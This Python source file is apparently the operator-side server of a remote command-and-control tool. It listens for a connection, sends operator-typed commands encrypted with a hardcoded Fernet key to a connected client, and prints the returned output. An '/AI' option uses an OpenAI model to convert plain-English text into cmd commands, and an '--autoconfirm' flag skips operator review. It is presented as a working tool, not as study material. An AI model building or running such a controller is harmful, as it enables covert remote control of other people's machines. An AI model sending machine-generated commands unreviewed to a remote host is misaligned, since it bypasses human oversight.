import socket
import openai
from cryptography.fernet import Fernet

key = b'6wifEyjwf89CwkUweVRcBMxU7ywgba3ayNRAm_0Gq9E='

class Socket(object):
    def __init__(self, ip, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((ip, port))
        self.apiKey = False
        
    def translateToCommand(self, apiKey, command):
        openai.api_key = apiKey
        confirm = False
        if command[-13:]=="--autoconfirm":
            confirm = True
            command = command[:-13]
        response = openai.Completion.create(
          model="text-davinci-003",
          prompt=f"Convert this text to a programmatic command in cmd: {command}",
          temperature=0,
          max_tokens=1000
        )
        command = response["choices"][0]["text"].strip()
        if confirm:
            return command
        while True:
            ask = input(f"{command}\ny/n")
            if ask == "y":
                return command
            elif ask == "n":
                return False
        
    def encrypt(self, msg, key):
        ferObject = Fernet(key)
        msgEncrypt = ferObject.encrypt(msg)
        return msgEncrypt

    def decrypt(self, msg, key):
        ferObject = Fernet(key)
        msgDecrypt = ferObject.decrypt(msg)
        return msgDecrypt

    def sendMsg(self, msg, conn):
        msg = self.encrypt(msg, key)
        header = str(len(msg)).encode() #to send to the client the current length of the message
        conn.send(header)
        conn.send(msg) #sending the real message

    def readMsg(self, conn):
        header = conn.recv(5)
        msg = conn.recv(int(header.decode()))
        return self.decrypt(msg, key).decode()
    
    def connection(self):       
        while True:  
            print("[+] >> Listening!")
            self.server.listen()
            conn, addr = self.server.accept()
            print(f"[+] >> Connection from {addr[0]} has been established! \n")
            while True:
                command = input("[+] >> Please enter command to be sent to client: ")
                if command == "close":
                    self.server.close()
                if command.startswith('/AI'):
                    if self.apiKey == False:
                        self.apiKey = input('[+] >> Please provide API key: ')
                    command = self.translateToCommand(self.apiKey, command[3:])
                if command != False:
                    self.sendMsg(command.encode(), conn)
                    out = self.readMsg(conn)
                    print(out + "\n")

Socket("Client IP", PORT).connection()
